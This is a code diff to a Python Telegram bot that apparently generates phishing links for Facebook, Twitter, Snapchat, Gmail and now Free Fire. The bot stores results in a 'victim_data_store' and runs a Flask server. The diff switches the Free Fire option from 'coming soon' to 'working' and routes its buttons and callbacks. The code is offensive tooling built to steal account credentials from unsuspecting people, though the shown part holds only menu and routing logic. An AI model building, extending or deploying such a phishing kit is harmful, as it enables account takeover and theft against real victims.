@@ -9,7 +9,8 @@ from bot.buttons import (
     handle_face_button, handle_face_callback,
     handle_twit_button, handle_twit_callback,
     handle_snap_button, handle_snap_callback,
-    handle_gmail_button, handle_gmail_callback
+    handle_gmail_button, handle_gmail_callback,
+    handle_freefire_button, handle_freefire_callback
 )
 from bot.server import app
 from bot.utils.storage import link_cache, victim_data_store
@@ -78,7 +79,7 @@ def show_main_menu(message):
         "🐦 Twitter (working)\n"
         "👻 Snapchat (working)\n"
         "📧 Gmail (working)\n"
-        "🎮 Free Fire (coming soon)\n"
+        "🎮 Free Fire (working)\n"
         "🔗 All Links (coming soon)",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
@@ -107,8 +108,10 @@ def route_buttons(message):
         handle_snap_button(bot, message, get_bottom_buttons)
     elif text == "📧 Gmail":
         handle_gmail_button(bot, message, get_bottom_buttons)
-    elif text in ["🎮 Free Fire", "🔗 All Links"]:
-        bot.send_message(user_id, f"⏳ *{text}* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+    elif text == "🎮 Free Fire":
+        handle_freefire_button(bot, message, get_bottom_buttons)
+    elif text == "🔗 All Links":
+        bot.send_message(user_id, "⏳ *All Links* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
     else:
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
 
@@ -143,6 +146,11 @@ def handle_inline(call):
         handle_gmail_callback(bot, call)
         return
 
+    # Free Fire callbacks
+    if data in ["free_copy", "free_back", "free_menu"]:
+        handle_freefire_callback(bot, call)
+        return
+
     # Generic copy
     if data == "copy":
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
@@ -159,6 +167,6 @@ def run_bot():
             time.sleep(5)
 
 if __name__ == "__main__":
-    print("🤖 Bot Running...")
+    print("🤖 Bot Running... All 7 buttons working!")
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=5000, debug=False)
